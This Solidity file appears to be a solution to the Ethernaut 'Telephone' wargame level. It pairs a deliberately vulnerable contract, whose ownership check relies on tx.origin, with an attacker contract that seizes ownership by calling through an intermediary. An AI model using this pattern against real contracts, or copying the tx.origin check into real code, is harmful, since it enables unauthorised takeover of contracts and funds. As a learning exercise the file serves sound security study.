// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract EthernautTelephone {
    // Add your contract from the browser console 
    Telephone public noTxOrigTelephone = Telephone(0x3eF539937D44eAFdb5Df73F52b992d0Eac770701);

    function notTxOrigin() external {
        // Add your address to the contract from the browser console
        noTxOrigTelephone.changeOwner(0x77f2Dc5d302e71Ab6645622FAB27123E52e3e035);
    }
}
